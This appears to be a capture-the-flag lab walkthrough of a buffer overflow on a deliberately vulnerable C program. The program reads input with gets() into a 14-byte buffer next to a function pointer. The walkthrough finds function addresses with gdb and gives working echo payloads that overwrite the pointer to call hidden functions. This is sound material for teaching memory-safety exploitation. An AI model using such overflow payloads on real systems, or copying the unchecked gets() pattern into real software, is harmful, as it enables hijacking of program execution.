
The files:
```sh
[user1@ip-10-10-128-37 overflow-2]$ ls -la
total 16
drwxrwxr-x 2 user1 user1   48 Sep  2  2019 .
drwx------ 7 user1 user1  169 Nov 27  2019 ..
-rwxrwxr-x 1 user1 user1 8368 Sep  2  2019 func-pointer
-rw-rw-r-- 1 user1 user1  411 Sep  2  2019 func-pointer.c
```

The code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

void special()
{
    printf("this is the special function\n");
    printf("you did this, friend!\n");
}

void normal()
{
    printf("this is the normal function\n");
}

void other()
{
    printf("why is this here?");
}

int main(int argc, char **argv)
{
    volatile int (*new_ptr) () = normal;
    char buffer[14];
    gets(buffer);
    new_ptr();
}
```

Test run:
```sh
[user1@ip-10-10-167-49 overflow-2]$ ./func-pointer 
test
this is the normal function

[user1@ip-10-10-167-49 overflow-2]$ ./func-pointer 
12345678901234123
Segmentation fault
```

Getting the addresses of the other functions using gdb:
```sh
[user1@ip-10-10-77-8 overflow-2]$ gdb func-pointer
...
Reading symbols from func-pointer...(no debugging symbols found)...done.

(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000400438  _init
0x0000000000400460  puts@plt
0x0000000000400470  printf@plt
0x0000000000400480  gets@plt
0x0000000000400490  _start
0x00000000004004c0  deregister_tm_clones
0x00000000004004f0  register_tm_clones
0x0000000000400530  __do_global_dtors_aux
0x0000000000400560  frame_dummy
0x0000000000400567  special
0x0000000000400582  normal
0x0000000000400593  other
0x00000000004005a9  main
0x00000000004005f0  __libc_csu_init
0x0000000000400660  __libc_csu_fini
0x0000000000400664  _fini

(gdb) quit
```

Function addresses:
0x0000000000400567  special
0x0000000000400593  other

Running it and redirecting execution by changing the function pointer through buffer overflow:
```sh
[user1@ip-10-10-15-3 overflow-2]$ ls -la
total 16
drwxrwxr-x 2 user1 user1   48 Sep  2  2019 .
drwx------ 7 user1 user1  169 Nov 27  2019 ..
-rwxrwxr-x 1 user1 user1 8368 Sep  2  2019 func-pointer
-rw-rw-r-- 1 user1 user1  411 Sep  2  2019 func-pointer.c

[user1@ip-10-10-15-3 overflow-2]$ echo -ne "12345678901234\x67\x05\x40\x0\x0\x0\x0\x0" | ./func-pointer
this is the special function
you did this, friend!

[user1@ip-10-10-15-3 overflow-2]$ echo -ne "12345678901234\x93\x05\x40\x0\x0\x0\x0\x0" | ./func-pointer
why is this here?
```
